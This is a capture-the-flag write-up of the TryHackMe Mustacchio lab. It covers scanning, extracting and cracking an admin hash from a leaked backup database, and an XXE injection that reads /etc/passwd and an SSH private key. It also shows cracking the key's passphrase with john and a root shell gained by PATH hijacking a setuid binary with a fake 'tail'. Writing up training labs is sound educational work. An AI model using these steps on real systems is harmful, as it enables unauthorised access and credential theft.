---
title: "TryHackMe - Mustacchio  Writeup"
date: 2025-04-17
categories: [CTF, tryhackme]
image: /assets/2025/THM/Mustacchio/logo.png
alt: "tryhackme wallpaper"
---

The first step in any CTF or penetration test is to perform reconnaissance. I used Nmap, port scanner, to identify what services the target machine was running and what ports were open.

```bash
nmap -sV -T4 10.10.20.238
```
`-sV`: Enables service version detection. This tells Nmap to try to determine what software and version are running on open ports.

`-T4`: Sets the scan speed to “Aggressive”, good for fast results in a CTF scenario where stealth isn’t a concern.

`10.10.20.238`: The IP address of the target machine.

This revealed:
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
8765/tcp open  http    syn-ack ttl 63 nginx 1.10.3
```
`Port 22 (SSH)`: Secure Shell, potential for remote access if credentials or a private key are found.

`Port 80 (HTTP)`: A classic Apache web server; possibly a website to explore for vulnerabilities.

`Port 8765 (HTTP)`: Uncommon port running NGINX, this could be an internal tool or admin panel. Worth deeper fuzzing.

Once we knew there were web services running, the next logical step was to brute-force directories on the website to find hidden resources like files, login panels, backups, or config directories.

```bash
gobuster dir -u http://10.10.20.238/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results:
```bash
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.238/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.20.238/images/]
/custom               (Status: 301) [Size: 313] [--> http://10.10.20.238/custom/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.20.238/fonts/]
```

While exploring `/custom/`, I discovered a folder `/js/` where is interesting file called `users.bak` which turned out to be a SQLite database. That's a potential goldmine for credentials!

![Mustacchio ](/assets/2025/THM/Mustacchio/3.png) 

### Finding Credentials for the Admin Panel

I downloaded the users.bak file and checked its type.

```bash
file users.bak
```
This showed:

```bash
SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

Next, I opened it using the SQLite command-line tool:

```bash
sqlite3 users.bak
sqlite> .tables
sqlite> SELECT * FROM users;
```
Result:

```bash
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

The second column looked like a hashed password. I used hashid to identify the hash type.

```bash
hashid 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Output: SHA-1
```
To recover the password, I used website crackstation to try to crack there.

![Mustacchio](/assets/2025/THM/Mustacchio/5.png) 

After checking the main web page on port 80, I didn’t find anything useful, it looked like a default or empty Apache page. So, I decided to check out the service on port 8765, which Nmap told me was running NGINX.

![Mustacchio](/assets/2025/THM/Mustacchio/1.png) 

![Mustacchio](/assets/2025/THM/Mustacchio/2.png) 

To my surprise, I found an admin login panel. Remembering the credentials from the earlier users.bak file, I tried logging in and it worked! 

![Mustacchio](/assets/2025/THM/Mustacchio/6.png) 

Once inside the admin interface, there was a section to submit comments. I fired up Burp Suite to intercept the request and request body included a parameter called `xml`. While inspecting the HTTP response, I noticed something. 

![Mustacchio](/assets/2025/THM/Mustacchio/7.png)

An HTML comment inside the source code:

```bash
<!-- /auth/dontforget.bak -->
```

This pointed to a potentially sensitive file, but when I visited it, it was trash.

A second HTML comment caught my attention:

```bash
Barry, you can now SSH in using your key!
```
This was a huge clue! It hinted that another user named Barry had SSH access via a private key.

### Testing XXE Injection

I began experimenting with custom XML payloads. The form accepted an XML block with three attributes: `name`, `author`, and `comment`.

![Mustacchio](/assets/2025/THM/Mustacchio/8.png)

The values I entered, especially in <name>, <author> were reflected back in the web page response. This confirmed that, the input was being parsed as XML and I tried XXE injection for potential XXE vulnerability.

[XXE injection](https://portswigger.net/web-security/xxe)

Based on this, I tested a well-known XXE attack to try and read system files like `/etc/passwd`.

This payload worked, the contents of `/etc/passwd` were displayed inside the <name> field on the page. That confirmed the vulnerability was exploitable.

From here, I moved on to reading more sensitive paths like `/home/barry/.ssh/id_rsa`

![Mustacchio](/assets/2025/THM/Mustacchio/9.png)

By using this XXE payload, I directly extracted the user flag from Barry’s home directory without needing to log in as Barry.

![Mustacchio](/assets/2025/THM/Mustacchio/10.png)

### Cracking a Private SSH Key

At some point during enumeration or via XXE or file browsing, I found a private SSH key: id_rsa.

To crack the key’s passphrase:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:
```bash
┌──(root㉿vincasec)-[~]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uri------- (id_rsa) 
```
Now I had SSH access using the private key.
```bash
chmod 600 id_rsa
ssh -i id_rsa barry@10.10.20.238
```

### Privilege Escalation via PATH Hijacking

As Barry, I found a binary called `live_log` in `/home/joe/` that was owned by root and had the setuid bit set. The setuid permission means that this binary runs with the privileges of its owner, which in this case is root, so it’s a potential privilege escalation vector.

```bash
file live_log

live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

```bash
strings live_log

Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```
`tail`: A command used to display the end (tail) of a file. When used with the -f option, it follows the file, showing any new lines appended to the file in real-time.

[Tail command in Linux with examples](https://www.geeksforgeeks.org/tail-command-linux-examples/)

`/var/log/nginx/access.log`: This is the log file for NGINX, a popular web server. The file records every incoming request, including the IP address, request type, and status code. It's often useful for monitoring traffic or diagnosing issues.

Next, I ran a command to find all setuid binaries on the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```
This command lists all files with the setuid permission (those that run with the owner’s privileges) and that’s how I discovered that `live_log` could be executed as root.

The binary ran `tail`, but without an absolute path. This was a potential vulnerability, but I needed to figure out how to hijack the PATH so that my own version of tail would execute instead of the real one.

After some research and Googling, I stumbled upon Path Hijacking Privilege Escalation as the solution. Here's how I could exploit it:

[Path Hijacking Privilege Escalation - Linux PE.](https://pentesterarchive.github.io/posts/PathHijacking/)

#### The Exploit: Path Hijacking

The idea was to create a malicious version of tail that would run bash (a shell) instead of actually calling tail. Since the live_log binary called tail without using its absolute path (e.g., /usr/bin/tail), it would first look in the directories listed in the PATH environment variable. By modifying the PATH, I could make sure that my own version of tail would be called.

Creating a Malicious tail:

```bash
cd /tmp
echo "/bin/bash" > tail
chmod +x tail
export PATH=/tmp:$PATH
```

At this point, I executed the live_log binary:
```bash
/home/joe/live_log
```
Since the PATH was now modified, the malicious tail was executed instead of the original one, and I was dropped into a root shell and I got root flag.

```bash
root@mustacchio:/tmp# whoami
root
cd /root
cat root.txt
```

Thanks for taking the time to read my writeup. I hope it was helpful.



